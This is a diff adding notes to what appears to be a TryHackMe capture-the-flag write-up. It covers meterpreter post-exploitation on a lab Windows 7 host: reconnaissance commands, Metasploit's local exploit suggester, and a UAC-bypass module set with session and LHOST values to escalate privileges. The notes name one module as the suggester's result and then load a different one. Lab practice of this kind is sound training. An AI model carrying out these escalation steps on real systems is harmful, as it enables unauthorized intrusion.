@@ -35,4 +35,49 @@ ans is RHOSTS and the RPORT is already correct so we:
 `exploit`
 
 ## Escalate
-### 
+### What's the name of the shell we have now?
+meterpreter
+more about meterpreter https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/
+
+### What user was running the icecast process?
+`help` in meterpreter shell lists out commands
+`getuid` gets our current username, Dark-PC\Dark - meaning our user is Dark
+
+### What build of Windows is the system?
+`sysinfo` shows us various info including os & build / service packs
+this line 'OS              : Windows 7 (6.1 Build 7601, Service Pack 1).'
+shows us the answer is 7601
+
+### finer details: what is the architecture of the process we're running?
+The system architecture is x64 as shown in the sysinfo, but we don't know for certain that the process is the same
+`getpid` gives us our process id, 2260
+`ps` shows us a list of processes, track down 2260 and we see:
+'2260  1328  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe'
+the 'arch' cvolumn shows us x86
+
+Answer is x64 though? I guess it wanted the machine architecture and not the process
+
+### run the local exploit suggester
+in the meterpreter:
+'run post/multi/recon/local_exploit_suggester'
+
+### What's the first result?
+'exploit/windows/local/ikeext_service: The target appears to be vulnerable.'
+answer is 'exploit/windows/local/ikeext_service'
+
+### background session, load the next exploit (first result from prev q)
+ctrl-z to background
+`use exploit/windows/local/bypassuac_eventvwr'
+`show options` - shows us we just need the session number
+`sessions` gets active sessions, our session id is 1
+`set SESSION 1`
+
+### Now that we've set our session number, more options in the options menu
+`show options` - we now see our external ip is the lhost rather than the tryhackme one
+`set LHOST {thm ip}`
+`exploit`
+
+### command getprivs lets us verify we have expanded permissions, what permission allows us to take ownership of files?`
+SeTakeOwnershipPrivilege looks right, and it is
+
+## Looting
